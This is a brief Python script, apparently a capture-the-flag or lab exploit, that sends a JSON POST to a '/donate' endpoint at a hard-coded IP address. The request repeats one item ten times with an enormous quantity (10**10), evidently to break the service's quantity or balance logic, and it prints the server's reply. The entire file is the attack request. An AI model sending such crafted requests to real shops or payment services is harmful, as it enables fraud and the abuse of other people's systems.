import requests as req
import json
from pprint import pprint

url = "http://103.152.242.243:2869/donate"

tvent = {
   "id" : 4,
   "quantity" : 10**10,
}

items = [tvent for i in range(10)]
data = {
   "items" : items
}

headers = {'content-type': 'application/json'}
r = req.post(url, json=data, headers=headers)
print(data)
pprint(json.loads(r.content))